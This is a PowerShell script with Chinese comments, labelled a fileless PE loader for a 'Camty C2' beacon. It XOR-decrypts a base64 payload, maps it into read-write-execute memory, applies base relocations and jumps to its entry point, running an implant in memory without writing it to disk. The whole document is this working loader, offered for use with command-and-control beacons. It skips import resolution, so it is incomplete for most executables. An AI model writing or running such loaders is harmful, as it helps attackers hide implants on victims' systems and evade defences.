# Camty C2 无文件 PE 加载器（PowerShell，x64）
# 用法：
#   $b = Get-Content packed.b64 -Raw
#   .\invoke_pe.ps1 -Blob $b -Key camty
# 流程：base64 → XOR 解密 → 手动节映射到 RWX 内存 → 基址重定位 → 调 entrypoint。
# 适配 beacon（无限循环不退出）；若加载会 ExitProcess 的普通 exe，宿主进程同死。
param(
    [Parameter(Mandatory = $true)][string]$Blob,
    [string]$Key = "camty"
)

$ErrorActionPreference = "Stop"
Add-Type -Namespace Win -Name K32 -MemberDefinition @"
[System.Runtime.InteropServices.DllImport("kernel32")]
public static extern System.IntPtr VirtualAlloc(System.IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
"@

$bytes = [Convert]::FromBase64String($Blob.Trim())
$kb = [Text.Encoding]::UTF8.GetBytes($Key)
for ($i = 0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = $bytes[$i] -bxor $kb[$i % $kb.Length]
}
if ($bytes.Length -lt 0x40 -or [BitConverter]::ToUInt16($bytes, 0) -ne 0x5A4D) {
    throw "解密后非 PE（key 错误或数据损坏）"
}

$dos = [BitConverter]::ToUInt32($bytes, 0x3C)
$nt = $dos + 24                        # IMAGE_NT_HEADERS64
$machine = [BitConverter]::ToUInt16($bytes, $dos + 4)
if ($machine -ne 0x8664) { throw "仅支持 x64 PE（machine=0x{0:X4}）" -f $machine }
# 结构：e_lfanew → NT: Signature(4) FileHeader(20) → OptionalHeader 起点 = dos+4+20
$opt = $dos + 4 + 20
$entryRva = [BitConverter]::ToUInt32($bytes, $opt + 16)
$imageBase = [BitConverter]::ToUInt64($bytes, $opt + 24)
$sizeOfImage = [BitConverter]::ToUInt32($bytes, $opt + 56)
$numSections = [BitConverter]::ToUInt16($bytes, $dos + 4 + 2)
$sizeOfOpt = [BitConverter]::ToUInt16($bytes, $dos + 4 + 16)
$firstSection = $opt + $sizeOfOpt

$MEM = 0x3000; $RWX = 0x40
$baseAddr = [Win.K32]::VirtualAlloc([IntPtr]::Zero, $sizeOfImage, $MEM, $RWX)
if ($baseAddr -eq [IntPtr]::Zero) { throw "VirtualAlloc 失败" }
$delta = [Int64]([UInt64]$baseAddr - $imageBase)

# 复制 PE 头
$hdrSize = [BitConverter]::ToUInt32($bytes, $opt + 60)   # SizeOfHeaders
[Runtime.InteropServices.Marshal]::Copy($bytes, 0, $baseAddr, $hdrSize)

# 复制各节
for ($s = 0; $s -lt $numSections; $s++) {
    $sh = $firstSection + 40 * $s
    $vSize = [BitConverter]::ToUInt32($bytes, $sh + 8)
    $vAddr = [BitConverter]::ToUInt32($bytes, $sh + 12)
    $rSize = [BitConverter]::ToUInt32($bytes, $sh + 16)
    $rAddr = [BitConverter]::ToUInt32($bytes, $sh + 20)
    if ($rSize -gt 0) {
        $dst = [Int64]$baseAddr + $vAddr
        [Runtime.InteropServices.Marshal]::Copy($bytes, [Int64]$rAddr, [IntPtr]$dst, [Int64]$rSize)
    }
}

# 基址重定位（delta != 0 时处理 DIR64 重定位）
if ($delta -ne 0) {
    $relocRva = [BitConverter]::ToUInt32($bytes, $opt + 152)   # DataDirectory[5]
    $relocSize = [BitConverter]::ToUInt32($bytes, $opt + 156)
    if ($relocRva -gt 0 -and $relocSize -gt 0) {
        $p = [Int64]$baseAddr + $relocRva
        $end = $p + $relocSize
        while ($p -lt $end) {
            $b4 = New-Object byte[] 4
            [Runtime.InteropServices.Marshal]::Copy([IntPtr]$p, $b4, 0, 4)
            $pageRva = [BitConverter]::ToUInt32($b4, 0)
            $b4b = New-Object byte[] 4
            [Runtime.InteropServices.Marshal]::Copy([IntPtr]($p + 4), $b4b, 0, 4)
            $blockSize = [BitConverter]::ToUInt32($b4b, 0)
            if ($blockSize -le 0) { break }
            for ($o = 8; $o -lt $blockSize; $o += 2) {
                $eBytes = New-Object byte[] 2
                [Runtime.InteropServices.Marshal]::Copy([IntPtr]($p + $o), $eBytes, 0, 2)
                $entry = [BitConverter]::ToUInt16($eBytes, 0)
                $type = $entry -shr 12
                $off = $entry -band 0xFFF
                if ($type -eq 10) {   # IMAGE_REL_BASED_DIR64
                    $t = [Int64]$baseAddr + $pageRva + $off
                    $vBytes = New-Object byte[] 8
                    [Runtime.InteropServices.Marshal]::Copy([IntPtr]$t, $vBytes, 0, 8)
                    $val = [BitConverter]::ToUInt64($vBytes, 0)
                    $newVal = [UInt64]([Int64]$val + $delta)
                    [Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes($newVal), 0, [IntPtr]$t, 8)
                }
            }
            $p += $blockSize
        }
    }
}

# 调 entrypoint（beacon 的 main：无限循环，不返回）
$entry = [Int64]$baseAddr + $entryRva
$fn = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([IntPtr]$entry, [Action])
& $fn
